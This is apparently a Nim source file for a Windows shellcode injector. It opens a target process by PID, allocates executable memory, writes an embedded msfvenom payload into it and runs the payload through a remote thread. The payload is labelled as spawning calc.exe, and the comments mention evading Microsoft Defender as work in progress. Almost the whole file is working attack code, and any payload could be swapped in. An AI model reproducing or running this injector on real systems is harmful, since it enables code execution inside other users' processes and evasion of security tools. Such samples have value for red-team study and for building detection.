# Simple shellcode injector
# Injecting shellcode into running process - OpenProcess
# Works with Microsoft Defender disabled (WIP on this point)

import os
import strformat
import strutils
import winim
    
if (paramCount() != 1):
    echo &"(-) Usage: {paramStr(0)} <PID>"
    quit(1)

var buffer: LPVOID
var close_handle_status: WINBOOL
var execution_status: DWORD
var memory: WINBOOL
var pid:int 
var process: HANDLE
var shellcode: array[276, byte] # 276 = sizeof(shellcode), retrieved from msfvenom output
var shellcode_addr: LPCVOID
var thread: HANDLE
var tid: DWORD

# shellcode that spawns calc.exe
# msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
# 'byte' added at the beginning of payload
shellcode = [byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]

pid = paramStr(1).parseInt()

if (pid == 0):
    echo &"(-) Invalid PID"
    quit(1)

echo &"(?) Opening a process with PID = {pid}..."

process = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](pid)
)

if (process == 0):
    echo &"(-) Failed to open a process with PID = {pid}, error code: {GetLastError()}"
    quit(1)

echo &"(+) Process opened sucessfully, handle: {process}, PID: {GetProcessId(process)}, priority: {GetPriorityClass(process)}"


echo &"(?) Allocating memory for shellcode..."

buffer = VirtualAllocEx(
    process,
    NULL,
    sizeof(shellcode),
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

if(buffer == nil):
    echo &"(-) Failed to allocate memory for shellcode, error code: {GetLastError()}"
    close_handle_status =  CloseHandle(process)
    if (close_handle_status == 0):
        echo &"(-) Failed to close process handle, error code: {GetLastError()}"
    quit(1)

shellcode_addr = addr shellcode

echo &"(+) Memory allocated sucessfully, address: 0x{(cast[int](buffer)).toHex}, size: {sizeof(shellcode)}"

echo &"(?) Writing shellcode to allocated memory..."

memory = WriteProcessMemory(
    process,
    buffer,
    shellcode_addr,
    sizeof(shellcode),
    NULL
)

if (memory == 0):
    echo &"(-) Failed to write shellcode to allocated memory, error code: {GetLastError()}"
    close_handle_status = CloseHandle(process)
    if (close_handle_status == 0):
        echo &"(-) Failed to close process handle, error code: {GetLastError()}"
    quit(1)

echo &"(+) Shellcode written sucessfully"

echo &"(?) Creating a remote thread..."

thread = CreateRemoteThreadEx(
    process,
    NULL,
    0,
    cast[LPTHREAD_START_ROUTINE](buffer),
    NULL,
    0,
    NULL,
    addr tid
)

if (thread == 0):
    echo &"(-) Failed to create a remote thread, error code: {GetLastError()}"
    close_handle_status = CloseHandle(process)
    if (close_handle_status == 0):
        echo &"(-) Failed to close process handle, error code: {GetLastError()}"
    quit(1)

echo &"(+) Remote thread created sucessfully, handle: {thread}, TID: {tid}"

echo &"(?) Waiting for shellcode to execute..."

execution_status = WaitForSingleObject(thread, INFINITE)

if(execution_status == WAIT_FAILED):
    echo &"(-) Failed to wait for shellcode to execute, error code: {GetLastError()}"
    if (CloseHandle(thread) == 0 or CloseHandle(process) == 0):
        echo &"(-) Cleanup failed, error code: {GetLastError()}"
    quit(1)

echo &"(+) Shellcode executed sucessfully"

echo &"(?) Cleaning up..."

if (CloseHandle(thread) == 0 or CloseHandle(process) == 0):
    echo &"(-) Cleanup failed, error code: {GetLastError()}"
    quit(1)

echo &"(+) Cleaned up sucessfully"

quit(0)

